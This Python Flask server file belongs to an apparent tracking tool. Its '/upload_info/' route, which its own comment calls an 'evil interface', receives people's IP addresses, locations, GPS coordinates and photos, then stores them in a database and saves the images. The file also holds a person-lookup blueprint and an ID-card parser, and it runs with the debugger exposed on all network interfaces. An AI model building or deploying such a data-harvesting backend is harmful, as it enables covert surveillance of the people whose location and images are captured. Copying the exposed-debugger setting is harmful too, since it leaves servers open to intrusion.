#!/usr/bin/python python3
# coding=utf-8
'''
Author: whalefall
Date: 2021-08-20 03:02:54
LastEditTime: 2021-08-29 01:14:08
Description: Flask主文件
'''
from typing import Any, Union
from flask import *
from requests.api import get
from daniCheck import dani
from admin import admin
from flask import redirect, url_for, request, Response, render_template
from pathlib import Path
import base64
from pydantic import BaseModel
import time
from utils.sysinfo import sysinfo
from utils.uploadGithub import upload_catch_pic, save_base64_pic
from utils.parse_idcard import parseID, ParseIdResult
from utils.write_log import SeeInfo, Sql_log, getCNtimestamp
import threading
from functools import wraps  # 修复装饰器bug


class RespUpload(BaseModel):
    '''上传base64图片的响应信息'''
    code: int = 200
    msg: str


class BaseResp(BaseModel):
    '''响应的主要格式'''
    code: int = 200  # 响应代码
    msg: str = None  # 响应信息
    data: Any = None  # 响应信息

def error_return_501(func):
    '''函数如果错误就返回501'''
    @wraps(func)
    def inner(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            abort(501)
    return inner

def dontreturn(func):
    '''函数如果错误就返回原因与请求的装饰器,修复装饰器视图函数名重复的bug'''
    @wraps(func)
    def inner(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            return resp_parse(BaseResp(code=201, msg=f'通用接口错误,{e}'))
    return inner


app = Flask(__name__, template_folder='templates', static_folder='static')
app.config.from_pyfile('setting.py')

# 注册大沥查人蓝图
app.register_blueprint(dani)

# 注册后台管理蓝图
app.register_blueprint(admin)


def resp_parse(resp):
    '''BaseModel类型返回json'''
    return Response(json.dumps(resp.dict(), ensure_ascii=False, sort_keys=False), mimetype='application/json')


def request_parse(req_data) -> dict:
    '''解析请求数据并以字典的形式返回'''
    if req_data.method == 'POST':
        data = req_data.form

    elif req_data.method == 'GET':
        data = req_data.args

    return dict(data)


@app.errorhandler(401)
def authfail(e):
    return redirect('/static/401.jpg')


@app.route('/upload_base64pic/', methods=["POST", "GET"])
def upload():
    '''上传base64图片并保存到静态文件夹'''
    req_data = request_parse(request)
    base64_pic = req_data.get('base64')
    if base64_pic:
        try:
            save_base64_pic(base64_pic)
            r = RespUpload(code=200, msg="up suc!")
        except Exception as e:
            r = RespUpload(code=501, msg=f"Up error {e}")
        finally:
            return resp_parse(r)

    return resp_parse(RespUpload(code=502, msg="无内容?"))


@app.route('/upload_info/', methods=['POST', 'GET'])
@dontreturn
def upload_info():
    '''上传各种隐私数据并传入数据库log.db的邪恶接口
    传入参数:
    {ip:{ip,where},gps:{x(经度),y(纬度)},base64:base64图片}
    '''
    # upload_data = request_parse(request)
    upload_data = request.get_json()
    # 防止部分数据为空
    if not upload_data.get('ip'):
        upload_data['ip'] = {'ip': None, 'where': None}
    if not upload_data.get('gps'):
        upload_data['gps'] = {'x': None, 'y': None}

    i = SeeInfo(
        timestamp=getCNtimestamp(),
        ip=upload_data.get('ip').get('ip'),
        ip_addr=upload_data.get('ip').get('where'),
        gps_addr="%s,%s" % (upload_data.get('gps').get(
            'x'), upload_data.get('gps').get('y')),
        base64_pic=upload_data.get('base64')
    )
    sqlbot = Sql_log()
    sqlbot.insert(i)
    if i.base64_pic:
        try:
            save_base64_pic(i.base64_pic, file_name=i.timestamp)
            print('图片写入成功')
        except:
            pass

    return resp_parse(BaseResp(msg='upload suc'))


@app.route('/getlookinfo/', methods=['GET'])
def get_index():
    return render_template('getlookinfo.html')


@app.route('/sysinfo/', methods=["GET"])
@dontreturn
def _():
    '''获取系统信息返回'''
    return resp_parse(sysinfo())


@app.route('/', methods=['GET'])
def index():
    '''首页'''
    return render_template('index.html')


@app.route('/sfz/', methods=['GET'])
def _sfz():
    return render_template('sfz.html')


@app.route('/sfz/api/', methods=['GET', 'POST'])
@dontreturn
def parse_id_card():
    '''解析身份证'''
    req = request_parse(request)
    idcard = req.get('idcard')
    if not idcard:
        return resp_parse(BaseResp(code=501, msg="请传入请求参数idcard"))
    try:
        r = parseID(idcard)
    except Exception as e:
        return resp_parse(BaseResp(code=501, msg=f"解析身份证[{idcard}]出现问题{e},请检查身份证格式!"))
    else:
        return resp_parse(BaseResp(code=200, msg=f"身份证[{idcard}]解析成功!", data=r.dict()))


if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True, port=9000)
